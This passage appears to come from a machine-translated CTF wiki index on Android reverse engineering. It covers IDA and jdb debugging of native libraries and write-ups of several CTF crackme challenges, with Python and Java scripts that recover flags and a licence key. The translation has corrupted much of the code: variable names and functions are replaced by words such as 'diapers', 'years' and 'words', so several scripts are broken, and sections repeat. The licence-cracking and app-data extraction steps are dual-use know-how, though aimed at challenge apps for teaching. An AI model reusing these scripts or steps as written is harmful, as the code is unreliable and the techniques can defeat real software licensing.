localhost, port defaults to port 23946. In fact, it is the listening port of our local computer. as follows Click ok to start debugging note: > If only one program /bin/sh can be attached at the end, it means that the android_server program is not running with root privileges. Use ctrl+f to quickly locate and select the corresponding process, as follows Then ok OK. At this point we can see that we have attached success. At this time, we click Debugger-Debugger options again, and the related options are as follows: The meaning is similar to the native program. > Why do you choose to set the corresponding breakpoint at this time? Because if you set it at the beginning of the attach, there is actually no such thing here. Everyone can try.","title":"attach program"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#resume-app-execution","text":"At this time, the interface of the app is wait for debugger, and we have attached it. At this time, you need to let the program continue to run. First, we open ddms to select the process we want to debug. This is actually equivalent to direct execution. # Display all user processes available for debugging on the phone adb jdwp # Establish a connection between the xxx port of the PC and the corresponding port of the mobile phone to facilitate communication adb forward tcp:xxx jdwp:<pid> The reason why we don't use the command to execute is because we have to determine the process number of our apk ourselves, which is more troublesome. Here is a basic communication process At this point, our computer has established communication with the app's app virtual machine. At the same time, we need to use jdb in the java layer to attach our apk application to our computer, here we use the following command. jdb -connect com.sun.jdi.SocketAttach:hostname = localhost,port = xxx Where xxx is the 8700 port we saw in ddms, the default is this. After execution C: \\U sers \\i romise \u03bb jdb.bat jdb -connect com.sun.jdi.SocketAttach:hostname = 127 .0.0.1,port = 8700 Set uncaught java.lang.Throwable Set delayed uncaught java.lang.Throwable Initializing jdb... > Let\u2019s take a look at our mobile phone again. At this point, the application has continued to run, no longer the previous wait for debugger.","title":"Resume app execution"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#determining-the-native-function-address","text":"Here we open an ida again, import the sok of the apk, and then look for our function in export, as follows It can be seen that the offset is 0xc38. We then run F9 in the previous debug IDA until it is no longer running, we will see the program break at the linker At this point, we click on the app's interface to set the title button (the reason to press this, because the native API is called in the function), observe the IDA again, you can see that the so library has been loaded into B3B05000: loaded /data/app/com.droider.debugjniso-1/oat/arm/base.odex B39B9000: loaded /system/lib/hw/gralloc.msm8974.so B39B2000: loaded /system/lib/libmemalloc.so B39AA000: loaded /system/lib/libqdutils.so B3B00000: loaded /data/app/com.droider.debugjniso-1/lib/arm/libdebugjniso.so At this point, we use ctrl+s to locate 0xB3B00000 at the starting address of the library. Then according to Absolute address = base address + relative offset Get the address of the jnistring.","title":"Determining the native function address"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#observation-results","text":"Press g, then type +0xC38 and click ok to jump to the function libdebugjniso.so:B3B00C38 Java_com_droider_debugjniso_TestJniMethods_jniString libdebugjniso.so:B3B00C38 LDR R1, =(unk_B3B02148 - 0xB3B00C4C) libdebugjniso.so:B3B00C3C STMFD SP!, {R4,LR} libdebugjniso.so:B3B00C40 LDR R3, [R0] libdebugjniso.so:B3B00C44 ADD R1, PC, R1 ; unk_B3B02148 libdebugjniso.so:B3B00C48 MOV LR, PC We breakpoints at the beginning of this function, F2, and then execute the program again with F9. While watching the phone, we can see that the title of the app has changed to Hello! Nativemethod . At this point, the basic debugging steps of the so native program are over. Note: > If there is an add map dialog box in the middle, click Cancel, then apply.","title":"Observation results"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#precautions","text":"When using the simulator to debug an apk exception, it is very likely that the application has detected whether it is running in the simulator environment, consider using a mobile phone. When using the real machine debugging apk, it is also possible to encounter an exception, stuck in a certain instruction, then we can manually execute this instruction, and then set the PC to the address of the next instruction.","title":"Precautions"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#basic-native-program-debugging-method-2","text":"To be added.","title":"Basic native program debugging - Method 2"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#multithreaded-debugging","text":"","title":"Multithreaded debugging"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#_1","text":"http://www.52pojie.cn/thread-554068-1-1.html https://www.kanxue.com/chm.htm?id=10296&pid=node1000944","title":"\u53c2\u8003\u9605\u8bfb"},{"location":"android/basic_reverse/dynamic/ida_smali_debug/","text":"IDA Dynamically debugging smali code \u00b6","title":"IDA Dynamically debugging smali code"},{"location":"android/basic_reverse/dynamic/ida_smali_debug/#ida-dynamically-debugging-smali-code","text":"","title":"IDA Dynamically debugging smali code"},{"location":"android/basic_reverse/static/complex-example/","text":"Static analysis comprehensive topic \u00b6 2017 ISCC Crackone \u00b6 Using jadx to decompile, you can get the basic logic of the program as follows Base64 encoding the content entered by the user, then inserting \\r\\n at the specified length position. This does not seem to be a mess. The program then passes the encoded content to the check function in so. The logic of this function is as follows env = a1 ; len = diapers ; str = pstr ; v7 = malloc ( full ); (( * env ) -> GetByteArrayRegion )( env , str , 0 , len , v7 ); v8 = malloc ( only + 1 ); memset ( v8 , 0 , len + 1 ); memcpy ( v8 , v7 , len ); v9 = 0 ; for ( i = 0 ; ; ++ i ) { -- v9 ; if ( i >= len / 2 ) break ; v11 = v8 [ i ] -5 ; v8 [ i ] = v8 [ only + v9 ]; v8 [ only + v9 ] = v11 ; } v8 [ len ] = 0 ; v12 = strcmp ( v8 , \"=0HWYl1SE5UQWFfN?I+PEo.UcshU\" ); free ( v8 ); free ( v7 ); return v12 <= 0 ; It is not difficult to see that the program directly performs the appropriate operation of the two halves of the string after base64. Here we can easily write the recovery code corresponding to python, as follows import base64 def solve (): ans = & #39;= 0HWYl1SE5UQWFfN? I + PEo.UcshU&#39; length = len ( ans ) flag = [ 0 ] * length beg = 0 end = length while beg < length / 2 : end -= 1 flag [ beg ] = chr ( word ( ans [ end ]) + 5 ) flag [ end ] = ans [ beg ] beg + = 1 flag = '' . join ( flag ) print base64 . b64decode ( flag ) if __name__ == \"__main__\" : solve () The corresponding results are as follows \u279c 2017ISCC python exp.py flag { ISCCJAVANDKYXX } 2017 NJCTF easycrack \u00b6 Through simple reverse, you can find that the basic logic of the program is as follows Monitor the interface text box and call the native parseText function if the text box content changes. The main functions of parseText are as follows First call the java layer function messageMe to get a string mestr. The logic of this function is basically XOR each of the strings after the last . of packagename in sequence, and stitch the results together. Then use the mestr length as the period to XOR the two, the core logic `str[i + j] = mestr[j] ^ iinput[i + j]; Next, use I_am_the_key as the key, encrypt the part with RC4 encryption, and compare the result with the final compare . The basis for guessing here is as follows There are 256 keywords in the init function, and basically the initialization process of the RC4 key. The crypt function is obviously an RC4 encryption function, which is obviously the cryptographic logic of RC4. The decryption script is as follows from Crypto.Cipher import ARC4 def messageme (): name = 'easycrack' init = 51 ans = & quot ; & quot ; for c in name : init = ord ( c ) ^ init years + = chr ( init ) return years def decrypt ( cipher , key ): plain = \"\" for i in range ( 0 , len ( cipher ), len ( key )): tmp = cipher [ i : i + len ( key )] plain += '' . join ( chr ( ord ( tmp [ i ]) ^ ord ( key [ i ])) for i in range ( len ( tmp ))) return plain def main (): rc4 = ARC4 . new ( 'I_am_the_key' ) cipher = 'C8E4EF0E4DCCA683088134F8635E970EEAD9E277F314869F7EF5198A2AA4' cipher = '' . join ( chr ( int ( cipher [ i : i + 2 ], 16 )) for i in range ( 0 , len ( cipher ), 2 )) middleplain = rc4 . decrypt ( cipher ) mestr = messageme () print decrypt ( middleplain , mestr ) if __name__ == '__main__' : main () Results are as follows \u279c 2017NJCTF-easycrack python exp.py It_s_a_easyCrack_for_beginners \u279c 2017NJCTF-easycrack 2018 \u5f3a\u7f51\u676f picture lock \u00b6 After simple analysis, it is found that this is an image encryption program: the java layer is the first file name of the native layer under image/, and the name of the image file that you want to encrypt, including the md5 of the signature of the corresponding apk. Now we can analyze the native layer code. Since the program is obviously an encryption program, we can use IDA's findcrypto plugin to identify it. The result is that the S box is found, and basically it is the AES encryption process. It can be basically determined that the main body of the program is an AES encryption. After careful analysis, the basic flow of the native layer program can be found as follows: Split the md5 string of the incoming signature into two halves to generate two sets of keys. Read md5sig[i%32] size each time Decide which set of keys to use based on the size of the read in Odd uses the second set of keys Use the first set of keys evenly If the size of the read is not enough, it will be padded with insufficient size (for example, when the size is 12, fill 4 0x4) At this time, the modified content must be 16 bytes, and the first 16 bytes are AES encrypted. For the following bytes, it is XORed with md5sig[i%32]. Since we know the encryption algorithm, it is very easy to reverse, we can first get the signature md5, as follows \u279c picturelock keytool -list -printcert -jarfile picturelock.apk Signer #1: signature: Owner: CN = a, OU = b, O = c, L = d, ST = e, C = ff Publisher: CN = a, OU = b, O = c, L = d, ST = e, C = ff Serial number: 5f4e6be1 Valid for Fri Sep 09 14 :32:36 CST 2016 to Tue Sep 03 14 :32:36 CST 2041 Certificate fingerprint: MD5: F8: C4: 90 : 56 : E4: CC: F9: A1: 1E: 09 : 0E: AF: 47 : 1F: 41 : 8D SHA1: 48 : E7: 04 : 5E: E6: 0D: 9D: 8A: 25 : 7C: 52 : 75 : E5: 65 : 06 : 09 : A5: CC: A1: 3E SHA256: BA: 12 : C1: 3F: D6: 0E: 0D: EF: 17 : AE: 3A: AD: 5D: 6E: 86 : 87 : 0C: 8E: 38 Signature Algorithm Name: SHA256withRSA Subject public key algorithm: 2048 -bit RSA key Version: 3 Extension: #1: ObjectId: 2.5.29.14 Criticality=false SubjectKeyIdentifier [ KeyIdentifier [ 0000 : 71 A3 2A FB D3 F4 A9 A9 2A 74 3F 29 8E 67 8A EA q.*.....*t? ) .g.. 0010 : 3B DD 30 E3 ; .0. ] ] \u279c picturelock md5value = F8:C4:90:56:E4:CC:F9:A1:1E:09:0E:AF:47:1F:41:8D \u279c picturelock echo $md5value | sed 's/://g' | tr '[:upper:]' '[:lower:]' f8c49056e4ccf9a11e090eaf471f418d Then we can use the existing AES library to decrypt directly #!/usr/bin/env python import itertools sig = & #39;f8c49056e4ccf9a11e090eaf471f418d&#39; from Crypto.Cipher import AES def decode_sig ( payload ): ans = & quot ; & quot ; for i in range ( len ( payload )): ans + = chr ( words ( payload [ i ]) ^ words ( sig [( 16 + i ) % 32 ])) return years def dec_aes (): data = open ( 'flag.jpg.lock' , 'rb' ) . read () jpg_data = & #39;&#39; f = open ( 'flag.jpg' , 'wb' ) idx = 0 i = 0 cipher1 = AES . new ( sig [: 0x10 ]) cipher2 = AES . new ( sig [ 0x10 :]) while idx < len ( data ): read_len = words ( say [ in % 32 ]) payload = data [ idx : idx + read_len ] #print('[+] Read %d bytes' % read_len) print ( '[+] Totally %d / %d bytes, sig index : %d ' % ( idx , len ( data ), i )) if read_len % 2 == 0 : f . write ( cipher1 . decrypt ( payload [: 0x10 ])) else : f . write ( cipher2 . decrypt ( payload [: 0x10 ])) f . write ( decode_sig ( payload [ 16 :])) f . flush () idx += read_len i += 1 print ( '[+] Decoding done ...' ) f . close () dec_aes () Finally, you can get the result of a picture decryption, which contains the flag.","title":"Android Static Analysis Hybrid Example"},{"location":"android/basic_reverse/static/complex-example/#static-analysis-comprehensive-topic","text":"","title":"Static analysis comprehensive topic"},{"location":"android/basic_reverse/static/complex-example/#2017-iscc-crackone","text":"Using jadx to decompile, you can get the basic logic of the program as follows Base64 encoding the content entered by the user, then inserting \\r\\n at the specified length position. This does not seem to be a mess. The program then passes the encoded content to the check function in so. The logic of this function is as follows env = a1 ; len = diapers ; str = pstr ; v7 = malloc ( full ); (( * env ) -> GetByteArrayRegion )( env , str , 0 , len , v7 ); v8 = malloc ( only + 1 ); memset ( v8 , 0 , len + 1 ); memcpy ( v8 , v7 , len ); v9 = 0 ; for ( i = 0 ; ; ++ i ) { -- v9 ; if ( i >= len / 2 ) break ; v11 = v8 [ i ] -5 ; v8 [ i ] = v8 [ only + v9 ]; v8 [ only + v9 ] = v11 ; } v8 [ len ] = 0 ; v12 = strcmp ( v8 , \"=0HWYl1SE5UQWFfN?I+PEo.UcshU\" ); free ( v8 ); free ( v7 ); return v12 <= 0 ; It is not difficult to see that the program directly performs the appropriate operation of the two halves of the string after base64. Here we can easily write the recovery code corresponding to python, as follows import base64 def solve (): ans = & #39;= 0HWYl1SE5UQWFfN? I + PEo.UcshU&#39; length = len ( ans ) flag = [ 0 ] * length beg = 0 end = length while beg < length / 2 : end -= 1 flag [ beg ] = chr ( word ( ans [ end ]) + 5 ) flag [ end ] = ans [ beg ] beg + = 1 flag = '' . join ( flag ) print base64 . b64decode ( flag ) if __name__ == \"__main__\" : solve () The corresponding results are as follows \u279c 2017ISCC python exp.py flag { ISCCJAVANDKYXX }","title":"2017 ISCC Crackone"},{"location":"android/basic_reverse/static/complex-example/#2017-njctf-easycrack","text":"Through simple reverse, you can find that the basic logic of the program is as follows Monitor the interface text box and call the native parseText function if the text box content changes. The main functions of parseText are as follows First call the java layer function messageMe to get a string mestr. The logic of this function is basically XOR each of the strings after the last . of packagename in sequence, and stitch the results together. Then use the mestr length as the period to XOR the two, the core logic `str[i + j] = mestr[j] ^ iinput[i + j]; Next, use I_am_the_key as the key, encrypt the part with RC4 encryption, and compare the result with the final compare . The basis for guessing here is as follows There are 256 keywords in the init function, and basically the initialization process of the RC4 key. The crypt function is obviously an RC4 encryption function, which is obviously the cryptographic logic of RC4. The decryption script is as follows from Crypto.Cipher import ARC4 def messageme (): name = 'easycrack' init = 51 ans = & quot ; & quot ; for c in name : init = ord ( c ) ^ init years + = chr ( init ) return years def decrypt ( cipher , key ): plain = \"\" for i in range ( 0 , len ( cipher ), len ( key )): tmp = cipher [ i : i + len ( key )] plain += '' . join ( chr ( ord ( tmp [ i ]) ^ ord ( key [ i ])) for i in range ( len ( tmp ))) return plain def main (): rc4 = ARC4 . new ( 'I_am_the_key' ) cipher = 'C8E4EF0E4DCCA683088134F8635E970EEAD9E277F314869F7EF5198A2AA4' cipher = '' . join ( chr ( int ( cipher [ i : i + 2 ], 16 )) for i in range ( 0 , len ( cipher ), 2 )) middleplain = rc4 . decrypt ( cipher ) mestr = messageme () print decrypt ( middleplain , mestr ) if __name__ == '__main__' : main () Results are as follows \u279c 2017NJCTF-easycrack python exp.py It_s_a_easyCrack_for_beginners \u279c 2017NJCTF-easycrack","title":"2017 NJCTF easycrack"},{"location":"android/basic_reverse/static/complex-example/#2018-picture-lock","text":"After simple analysis, it is found that this is an image encryption program: the java layer is the first file name of the native layer under image/, and the name of the image file that you want to encrypt, including the md5 of the signature of the corresponding apk. Now we can analyze the native layer code. Since the program is obviously an encryption program, we can use IDA's findcrypto plugin to identify it. The result is that the S box is found, and basically it is the AES encryption process. It can be basically determined that the main body of the program is an AES encryption. After careful analysis, the basic flow of the native layer program can be found as follows: Split the md5 string of the incoming signature into two halves to generate two sets of keys. Read md5sig[i%32] size each time Decide which set of keys to use based on the size of the read in Odd uses the second set of keys Use the first set of keys evenly If the size of the read is not enough, it will be padded with insufficient size (for example, when the size is 12, fill 4 0x4) At this time, the modified content must be 16 bytes, and the first 16 bytes are AES encrypted. For the following bytes, it is XORed with md5sig[i%32]. Since we know the encryption algorithm, it is very easy to reverse, we can first get the signature md5, as follows \u279c picturelock keytool -list -printcert -jarfile picturelock.apk Signer #1: signature: Owner: CN = a, OU = b, O = c, L = d, ST = e, C = ff Publisher: CN = a, OU = b, O = c, L = d, ST = e, C = ff Serial number: 5f4e6be1 Valid for Fri Sep 09 14 :32:36 CST 2016 to Tue Sep 03 14 :32:36 CST 2041 Certificate fingerprint: MD5: F8: C4: 90 : 56 : E4: CC: F9: A1: 1E: 09 : 0E: AF: 47 : 1F: 41 : 8D SHA1: 48 : E7: 04 : 5E: E6: 0D: 9D: 8A: 25 : 7C: 52 : 75 : E5: 65 : 06 : 09 : A5: CC: A1: 3E SHA256: BA: 12 : C1: 3F: D6: 0E: 0D: EF: 17 : AE: 3A: AD: 5D: 6E: 86 : 87 : 0C: 8E: 38 Signature Algorithm Name: SHA256withRSA Subject public key algorithm: 2048 -bit RSA key Version: 3 Extension: #1: ObjectId: 2.5.29.14 Criticality=false SubjectKeyIdentifier [ KeyIdentifier [ 0000 : 71 A3 2A FB D3 F4 A9 A9 2A 74 3F 29 8E 67 8A EA q.*.....*t? ) .g.. 0010 : 3B DD 30 E3 ; .0. ] ] \u279c picturelock md5value = F8:C4:90:56:E4:CC:F9:A1:1E:09:0E:AF:47:1F:41:8D \u279c picturelock echo $md5value | sed 's/://g' | tr '[:upper:]' '[:lower:]' f8c49056e4ccf9a11e090eaf471f418d Then we can use the existing AES library to decrypt directly #!/usr/bin/env python import itertools sig = & #39;f8c49056e4ccf9a11e090eaf471f418d&#39; from Crypto.Cipher import AES def decode_sig ( payload ): ans = & quot ; & quot ; for i in range ( len ( payload )): ans + = chr ( words ( payload [ i ]) ^ words ( sig [( 16 + i ) % 32 ])) return years def dec_aes (): data = open ( 'flag.jpg.lock' , 'rb' ) . read () jpg_data = & #39;&#39; f = open ( 'flag.jpg' , 'wb' ) idx = 0 i = 0 cipher1 = AES . new ( sig [: 0x10 ]) cipher2 = AES . new ( sig [ 0x10 :]) while idx < len ( data ): read_len = words ( say [ in % 32 ]) payload = data [ idx : idx + read_len ] #print('[+] Read %d bytes' % read_len) print ( '[+] Totally %d / %d bytes, sig index : %d ' % ( idx , len ( data ), i )) if read_len % 2 == 0 : f . write ( cipher1 . decrypt ( payload [: 0x10 ])) else : f . write ( cipher2 . decrypt ( payload [: 0x10 ])) f . write ( decode_sig ( payload [ 16 :])) f . flush () idx += read_len i += 1 print ( '[+] Decoding done ...' ) f . close () dec_aes () Finally, you can get the result of a picture decryption, which contains the flag.","title":"2018 \u5f3a\u7f51\u676f picture lock"},{"location":"android/basic_reverse/static/java-example/","text":"static analysis java layer example \u00b6 2014 tinyCTF Ooooooh! What does this button do \u00b6 Determining the file type \u00b6 Through the linux file command, you can see that the file is a compressed package. Unzip it and find that it is actually an apk file. Install apk \u00b6 After installing the file, check it out. It can be seen that it is to enter a string, and then the result should pop up. Viewing the program \u00b6 class C00721 implements OnClickListener { C00721 () { } public void onClick ( View view ) { if ((( EditText ) MainActivity . this . findViewById ( C0073R . id . passwordField )). getText (). toString (). compareTo ( \"EYG3QMCS\" ) == 0 ) { MainActivity . this . startActivity ( new Intent ( MainActivity . this , FlagActivity . class )); } } } In the main program, you can find that if we enter the string EYG3QMCS will execute flagActivity.class. Then we can enter the following results. That is, get the flag. 2014 ASIS Cyber Security Contest Finals Numdroid \u00b6 Judging file type \u00b6 First use file to determine the file type, found that it is a compressed package, unzip it, get the corresponding file, and then continue to look at it, found that the file is an apk file. Installer \u00b6 Install the program. A quick look at the page, you can find that the program is mainly to enter a password, and then log in. If you make a mistake, the message \"Wrong Password\" will pop up. \u5206\u6790\u7a0b\u5e8f \u00b6 Locate the key functions in the source program based on the corresponding string. According to strings.xml, we can find the variable name of the string is wrong, and then we found the following code. protected void ok_clicked () { DebugTools . log ( \"clicked password: \" + this . mScreen . getText ()); boolean result = Verify . isOk ( this , this . mScreen . getText (). toString ()); DebugTools . log ( \"password is Ok? : \" + result ); if ( result ) { Intent i = new Intent ( this , LipSum . class ); Bundle b = new Bundle (); b . putString ( \"flag\" , this . mScreen . getText (). toString (). substring ( 0 , 7 )); i . putExtras ( b ); startActivity ( i ); return ; } Toast . makeText ( this , R . string . wrong , 1 ). show (); this . mScreen . setText ( \"\" ); } Continue to locate in Verify.isOk. as follows public static boolean isOk ( Context c , String _password ) { String password = _password ; if ( _password . length () > 7 ) { password = _password . substring ( 0 , 7 ); } String r = OneWayFunction ( password ); DebugTools . log ( \"digest: \" + password + \" => \" + r ); if ( r . equals ( \"be790d865f2cea9645b3f79c0342df7e\" )) { return true ; } return false ; } It can be found that the program mainly takes the first 7 bits of the password for OneWayFunction encryption, and then compares it with be790d865f2cea9645b3f79c0342df7e. Returns true if they are equal. Here we look at OneWayFunction again, as follows private static String OneWayFunction ( String password ) { List < byte []> bytes = ArrayTools . map ( ArrayTools . select ( ArrayTools . map ( new String [] { \"MD2\" , \"MD5\" , \"SHA-1\" , \"SHA-256\" , \"SHA-384\" , \"SHA-512\" }, new AnonymousClass1 ( password )), new SelectAction < byte []> () { public boolean action ( byte [] element ) { return element != null ; } }), new MapAction < byte [] , byte []> () { public byte [] action ( byte [] element ) { int i ; byte [] b = new byte [ 8 ] ; for ( i = 0 ; i < b . length / 2 ; i ++ ) { b [ i ] = element [ i ] ; } for ( i = 0 ; i < b . length / 2 ; i ++ ) { b [ ( b . length / 2 ) + i ] = element [ ( element . length - i ) - 2 ] ; } return b ; } }); byte [] b2 = new byte [ ( bytes . size () * 8 ) ] ; for ( int i = 0 ; i < b2 . length ; i ++ ) { b2 [ i ] = (( byte [] ) bytes . get ( i % bytes . size ())) [ i / bytes . size () ] ; } try { MessageDigest digest = MessageDigest . getInstance ( \"MD5\" ); digest . update ( b2 ); byte [] messageDigest = digest . digest (); StringBuilder hexString = new StringBuilder (); for ( byte aMessageDigest : messageDigest ) { String h = Integer . toHexString ( aMessageDigest & MotionEventCompat . ACTION_MASK ); while ( h . length () < 2 ) { h = \"0\" + h ; } hexString . append ( h ); } return hexString . toString (); } catch ( NoSuchAlgorithmException e ) { return \"\" ; } } The function probably executes several hash values, but if you analyze it yourself, it is too complicated. Because the answer space ( 10^7 10^7 ) of this question is relatively small, we can take the method in the verify class and violently run it. . Constructor \u00b6 After extracting the java program, add the main function to the Verify class and fix some errors to get the corresponding answer. The corresponding code here is placed in the folder corresponding to example. It should be noted that if the corresponding hash function does not exist, the source program will skip the corresponding function. I ran all without finding it, then removed an unusual MD2 algorithm and got the answer. This shows that android should be without the md2 algorithm. After input, you get the following Then we calculate the corresponding MD value, so that the flag is ASIS_3c56e1ed0597056fef0006c6d1c52463. 2014 Sharif University Quals CTF Commercial Application \u00b6 Installer \u00b6 First, install the program, just click the button, click on the button in the upper right will let us enter the key Just enter it and find that the program reports an error directly, telling us that it is wrong, then we can use this information to locate the key code. Positioning key code \u00b6 public static final String NOK_LICENCE_MSG = \"Your licence key is incorrect...! Please try again with another.\" ; public static final String OK_LICENCE_MSG = \"Thank you, Your application has full licence. Enjoy it...!\" ; private void checkLicenceKey ( final Context context ) { if ( this . app . getDataHelper (). getConfig (). hasLicence ()) { showAlertDialog ( context , OK_LICENCE_MSG ); return ; } View inflate = LayoutInflater . from ( context ). inflate ( C0080R . layout . propmt , null ); Builder builder = new Builder ( context ); builder . setView ( inflate ); final EditText editText = ( EditText ) inflate . findViewById ( C0080R . id . editTextDialogUserInput ); builder . setCancelable ( false ). setPositiveButton ( \"Continue\" , new OnClickListener () { public void onClick ( DialogInterface dialogInterface , int i ) { if ( KeyVerifier . isValidLicenceKey ( editText . getText (). toString (), MainActivity . this . app . getDataHelper (). getConfig (). getSecurityKey (), MainActivity . this . app . getDataHelper (). getConfig (). getSecurityIv ())) { MainActivity . this . app . getDataHelper (). updateLicence ( 2014 ); MainActivity . isRegisterd = true ; MainActivity . this . showAlertDialog ( context , MainActivity . OK_LICENCE_MSG ); return ; } MainActivity . this . showAlertDialog ( context , MainActivity . NOK_LICENCE_MSG ); } }). setNegativeButton ( & quot ; Cancel & quot ;, new C00855 ()); builder . create (). show (); } We found that, in fact, MainActivity.NOK_LICENCE_MSG stores the error string information, and then continue to read the discovery program. KeyVerifier . isValidLicenceKey ( editText . getText (). toString (), MainActivity . this . app . getDataHelper (). getConfig (). getSecurityKey (), MainActivity . this . app . getDataHelper (). getConfig (). getSecurityIv ()) To verify, if the verification is passed, the success message will be displayed. Detailed analysis \u00b6 Then we carefully analyze these three parameters. Parameter 1 \u00b6 Parameter 1 is actually the string we entered. Parameter 2 \u00b6 Is to use the function to get the getSecurityKey, we simply read, you can find that the program set the SecurityKey in the getConfig function public AppConfig getConfig () { boolean z = false ; AppConfig appConfig = new AppConfig (); Cursor rawQuery = this . myDataBase . rawQuery ( SELECT_QUERY , null ); if ( rawQuery . moveToFirst ()) { appConfig . setId ( rawQuery . getInt ( 0 )); appConfig . setName ( rawQuery . getString ( 1 )); appConfig . setInstallDate ( rawQuery . getString ( 2 )); if ( rawQuery . getInt ( 3 ) & gt ; 0 ) { z = true ; } appConfig . setValidLicence ( z ); appConfig . setSecurityIv ( rawQuery . getString ( 4 )); appConfig . setSecurityKey ( rawQuery . getString ( 5 )); appConfig . setDesc ( rawQuery . getString ( 7 )); } return appConfig ; } Among them, the function first accessed the database, SELECT_QUERY is as follows private static String DB_NAME = \"db.db\" ; private static String DB_PATH = \"/data/data/edu.sharif.ctf/databases/\" ; public static final String SELECT_QUERY = ( \"SELECT * FROM \" + TABLE_NAME + \" WHERE a=1\" ); private static String TABLE_NAME = \"config\" ; At the same time, we can get the path to the database. In further analysis, we can find that the program first gets the first line of the table config here, then sets iv to the value of the fourth column, and the key is set to the value of the fifth column. appConfig . setSecurityIv ( rawQuery . getString ( 4 )); appConfig . setSecurityKey ( rawQuery . getString ( 5 )); Parameter 3 \u00b6 In fact, parameter 3 is similar to parameter 2. I won't explain it here. Getting the database file \u00b6 First, we need to install the apk file on the phone, and then use the following command to get adb pull /data/data/edu.sharif.ctf/databases/db.db Then use the computer to view the sqlite software to check it, here I am using http://sqlitebrowser.org/ . as follows Here we can get it directly SecurityIv=a5efdbd57b84ca36 SecurityKey=37eaae0141f1a3adf8a1dee655853714 Analyze encrypted code \u00b6 public class KeyVerifier { public static final String CIPHER_ALGORITHM = \"AES/CBC/PKCS5Padding\" ; public static final String VALID_LICENCE = \"29a002d9340fc4bd54492f327269f3e051619b889dc8da723e135ce486965d84\" ; public static String bytesToHexString ( byte [] bArr ) { StringBuilder stringBuilder = new StringBuilder (); int length = bArr . length ; for ( int i = 0 ; i < length ; i ++ ) { stringBuilder . append ( String . format ( \"%02x\" , new Object [] { Integer . valueOf ( bArr [ i ] & 255 )})); } return stringBuilder . toString (); } public static String encrypt ( String str , String str2 , String str3 ) { String str4 = \"\" ; try { Key secretKeySpec = new SecretKeySpec ( hexStringToBytes ( str2 ), \"AES\" ); Cipher instance = Cipher . getInstance ( CIPHER_ALGORITHM ); instance . init ( 1 , secretKeySpec , new IvParameterSpec ( str3 . getBytes ())); str4 = bytesToHexString ( instance . doFinal ( str . getBytes ())); } catch ( Exception e ) { e . printStackTrace (); } return str4 ; } public static byte [] hexStringToBytes ( String str ) { int length = str . length (); byte [] bArr = new byte [ ( length / 2 ) ] ; for ( int i = 0 ; i < length ; i += 2 ) { bArr [ i / 2 ] = ( byte ) (( Character . digit ( str . charAt ( i ), 16 ) << 4 ) + Character . digit ( str . charAt ( i + 1 ), 16 )); } return bArr ; } public static boolean isValidLicenceKey ( String str , String str2 , String str3 ) { return encrypt ( str , str2 , str3 ). equals ( VALID_LICENCE ); } } You can see that the program first uses the encrypt function to encrypt the three strings. In fact, it is encrypted by the AES/CBC/PKCS5Padding method mentioned above, with str2 as the key and str3 as the initial vector. Then we can easily add the decryption function as follows public static String decrypt ( String input , String secretKey , String iv ) { String encryptedText = \"\" ; try { SecretKeySpec secretKeySpec = new SecretKeySpec ( hexStringToBytes ( secretKey ), \"AES\" ); Cipher cipher = Cipher . getInstance ( CIPHER_ALGORITHM ); cipher . init ( 2 , secretKeySpec , new IvParameterSpec ( iv . getBytes ())); encryptedText = bytesToHexString ( cipher . doFinal ( hexStringToBytes ( userInput ))); } catch ( Exception e ) { e . printStackTrace (); } return encryptedText ; } Then run the product key that gets the normal input fl ag-IS-see-ri-al-NU-MB-ER 2015-0CTF fiber \u00b6 Analysis \u00b6 First, analyze the code as follows public void confirm(View v) { if(\"0CTF{\" + String.valueOf(this.getSig(this.getPackageName())) + this.getCrc() + \"}\".equals( this.et.getText().toString())) { Toast.makeText(((Context)this), \"Yes!\", 0).show(); } else { Toast.makeText(((Context)this), \"0ops!\", 0).show(); } } private String getCrc() { String v1; try { v1 = String.valueOf(new ZipFile(this.getApplicationContext().getPackageCodePath()).getEntry( \"classes.dex\").getCrc()); } catch(Exception v0) { v0.printStackTrace (); } return v1; } private int getSig(String packageName) { int v4; PackageManager v2 = this.getPackageManager(); int v5 = 64; try { v4 = v2.getPackageInfo(packageName, v5).signatures[0].toCharsString().hashCode(); } catch(Exception v0) { v0.printStackTrace (); } return v4; } It can be seen that the flag we want is divided into two parts. String.valueOf(this.getSig(this.getPackageName())) this.getCrc() In the first part, we can write an app to get the corresponding value. In the second part, we can extract the dex file directly and use the online tools to calculate it. hashcode \u00b6 Just find one (put in the corresponding example folder) package com.iromise.getsignature; import android.content.pm.PackageInfo; import android.content.pm.PackageManager; import android.content.pm.Signature; import android.support.v7.app.AppCompatActivity; import android.os.Bundle; import android.text.TextUtils; import android.util.Log; import android.widget.Toast; public class MainActivity extends AppCompatActivity { private StringBuilder builder; public void onCreate(Bundle savedInstanceState) { super.onCreate (savedInstanceState); setContentView(R.layout.activity_main); PackageManager manager = getPackageManager(); builder = new StringBuilder(); String pkgname = &quot;com.ctf. fiber&quot;; boolean isEmpty = TextUtils.isEmpty(pkgname); if (isEmpty) { Toast.makeText(this, &quot;The application&#39;s package name cannot be empty!&quot;, Toast.LENGTH_SHORT); } else { try { PackageInfo packageInfo = manager.getPackageInfo(pkgname, PackageManager.GET_SIGNATURES); Signature[] signatures = packageInfo.signatures; Log.i(\"hashcode\", String.valueOf(signatures[0].toCharsString().hashCode())); } catch (PackageManager.NameNotFoundException e) e.printStackTrace (); } } } } Then filter out the hashcode in ddms 07-18 11:05:11.895 16124-16124/? I/hashcode: -183971537 Note: In fact, this program can be written as a small app, many programs will calculate the signature. classes.dex crc32 \u00b6 Just find an online website to get the CRC32 value of classes.dex . CRC-32 46e26557 MD5 Hash 3217b0ad6c769233ea2a49d17885b5ba SHA1 Hash ec3b4730654248a02b016d00c9ae2425379bf78f SHA256 Hash 6fb1df4dacc95312ec72d8b79d22529e1720a573971f866bbf8963b01499ecf8 It should be noted that this needs to be converted to decimal >>> print int(\"46E26557\", 16) 1189242199 flag \u00b6 After the two parts are finished, it is Flag. Flag\uff1a0ctf{-1839715371189242199} 2017 XMAN HelloSmali2 \u00b6 Give a smali file, we can do the following ideas Smali is assembled into a dex file using smali.jar. java -jar smali.jar assemble src.smali -o src.dex Decompile dex with jadx, as follows package com.example.hellosmali.hellosmali ; public class Digest { public static boolean check 